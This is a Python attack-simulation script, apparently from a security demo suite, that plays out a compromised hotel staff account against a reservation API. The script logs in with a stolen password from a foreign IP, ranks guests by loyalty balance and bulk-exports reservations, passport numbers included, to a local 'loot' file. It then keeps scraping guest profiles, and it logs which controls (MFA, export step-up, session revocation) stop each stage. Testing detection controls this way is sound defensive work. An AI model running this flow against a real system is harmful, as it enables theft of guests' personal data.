"""Scenario 1 (headline): compromised hotel management account bulk-exports guest reservations.

Modelled on the Marriott 2020 pattern: valid staff credentials, guests sorted by loyalty balance,
bulk access across properties. The attacker has the password only (no OTP), logs in from a new
device and a foreign IP at night, exports reservations, then keeps scraping guest profiles until
the session is terminated.

Controls that stop it: new_device_mfa (login), export_step_up (export).
"""

import csv
import io
import time

from common import (ATTACKER_UA, ROOT, base_args, blocked, contained, detail, load_seed, make_client, ok,
                    staff_login, step, warn)


def main():
    parser = base_args(__doc__)
    parser.add_argument("--staff", default=None, help="compromised staff id (default: seed demo target)")
    parser.add_argument("--ip", default="185.220.101.47")
    parser.add_argument("--clock", default="03:12", help="simulated local time at the hotel (demo mode)")
    parser.add_argument("--limit", type=int, default=4800)
    parser.add_argument("--scrape-seconds", type=int, default=600, help="keep scraping until revoked or timeout")
    args = parser.parse_args()
    seed = load_seed(args.seed)
    staff_id = args.staff or seed["demo_targets"]["headline_compromised_staff"]

    attacker = make_client(args.base, ip=args.ip, user_agent=ATTACKER_UA, demo_clock=args.clock)
    started = time.time()
    step(f"Logging in as {staff_id} with a stolen password from new device {attacker.headers['X-Device-Id']} ({args.ip})")
    result = staff_login(attacker, seed, staff_id, has_otp=False)
    if result.get("mfa_required"):
        blocked("new_device_mfa: login from an unknown device requires an OTP the attacker does not have")
        return
    if "error" in result:
        blocked(f"login failed: {result['error']}")
        return
    ok(f"Logged in as {result['staff']['name']} ({result['staff']['role_label']}), scope {result['staff']['property_scope']}")

    step("Recon: listing guests sorted by loyalty points")
    guests = attacker.get("/guests", params={"sort": "loyalty_points_desc", "page_size": 50}).json()["items"]
    ok(f"Top guest holds {guests[0]['loyalty']['points']:,} points" if guests and guests[0]["loyalty"] else "guest list read")

    step("Recon: paging through reservations across all properties")
    for page in (1, 2, 3):
        r = attacker.get("/reservations", params={"sort": "loyalty_points_desc", "page_size": 200, "page": page})
        if r.status_code != 200:
            blocked(f"reservation search denied: {detail(r).get('reason')}")
            return
    ok(f"{r.json()['total']:,} reservations visible to this account")

    step(f"Exporting top {args.limit:,} reservations by loyalty balance")
    r = attacker.post("/reservations/export", json={"sort": "loyalty_points_desc", "limit": args.limit})
    if r.status_code == 403 and detail(r).get("code") == "step_up_required":
        blocked(f"export_step_up: {detail(r).get('reason')}")
        return
    if r.status_code == 401:
        contained(f"session terminated before export: {detail(r).get('revoked_reason') or detail(r).get('reason')}")
        return
    r.raise_for_status()
    out_dir = ROOT / "out"
    out_dir.mkdir(exist_ok=True)
    loot = out_dir / f"loot-{int(time.time())}.csv"
    loot.write_text(r.text, encoding="utf-8")
    table = list(csv.reader(io.StringIO(r.text)))
    header, rows = table[0], table[1:]
    passport_col, guest_col = header.index("passport_no"), header.index("guest_id")
    unmasked_passports = sum(1 for row in rows if row[passport_col] and not row[passport_col].startswith("****"))
    warn(f"EXFILTRATED {len(rows):,} reservations -> {loot.relative_to(ROOT.parent)}")
    if unmasked_passports:
        warn(f"{unmasked_passports:,} rows contain FULL passport numbers (pii_masking is OFF)")
    else:
        ok("passport / phone / email columns were masked (pii_masking ON)")

    guest_ids = list(dict.fromkeys(row[guest_col] for row in rows))
    step(f"Persisting: scraping {len(guest_ids):,} guest profiles until access is cut off...")
    scraped = 0
    deadline = time.time() + args.scrape_seconds
    while time.time() < deadline and scraped < len(guest_ids):
        r = attacker.get(f"/guests/{guest_ids[scraped]}")
        if r.status_code == 401:
            d = detail(r)
            contained(f"session terminated by security monitoring ({d.get('code')}): {d.get('revoked_reason') or d.get('reason')}")
            contained(f"attack window {time.time() - started:.0f}s; profiles scraped before containment: {scraped}")
            return
        scraped += 1
        if scraped % 10 == 0:
            ok(f"scraped {scraped} profiles")
        time.sleep(1.5)
    warn(f"not contained within {args.scrape_seconds}s; scraped {scraped} profiles")


if __name__ == "__main__":
    main()
